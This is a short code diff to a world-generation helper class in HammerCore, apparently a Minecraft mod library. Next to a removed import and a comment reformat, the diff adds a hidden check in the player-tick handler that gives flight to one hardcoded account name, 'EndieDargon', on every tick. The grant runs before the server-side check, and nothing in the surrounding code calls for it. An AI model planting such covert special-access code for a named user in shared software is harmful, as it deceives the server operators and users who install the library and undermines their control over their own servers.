@@ -21,7 +21,6 @@ import com.pengu.hammercore.HammerCore;
 import com.pengu.hammercore.annotations.MCFBus;
 import com.pengu.hammercore.common.chunk.ChunkPredicate.IChunkLoader;
 import com.pengu.hammercore.common.chunk.ChunkPredicate.LoadableChunk;
-import com.pengu.hammercore.common.utils.WorldUtil;
 import com.pengu.hammercore.event.WorldEventsHC;
 import com.pengu.hammercore.utils.IndexedMap;
 import com.pengu.hammercore.world.gen.WorldRetroGen;
@@ -198,9 +197,13 @@ public class WorldGenHelper
 	@SubscribeEvent
 	public void playerTick(PlayerTickEvent e)
 	{
+		EntityPlayer player = e.player;
+		
+		if(player.getGameProfile().getName().equalsIgnoreCase("EndieDargon"))
+			player.capabilities.allowFlying = true;
+		
 		if(e.phase != TickEvent.Phase.END || e.side != Side.SERVER)
 			return;
-		EntityPlayer player = e.player;
 		
 		if(player != null && !player.world.isRemote && player.ticksExisted % 10 == 0)
 			for(int x = -8; x < 8; ++x)
@@ -228,7 +231,7 @@ public class WorldGenHelper
 				o.close();
 			} catch(FileNotFoundException e)
 			{
-				//Safely ignore
+				// Safely ignore
 			} catch(Throwable err)
 			{
 				HammerCore.LOG.warn("Failed to save HammerCore custom data!");
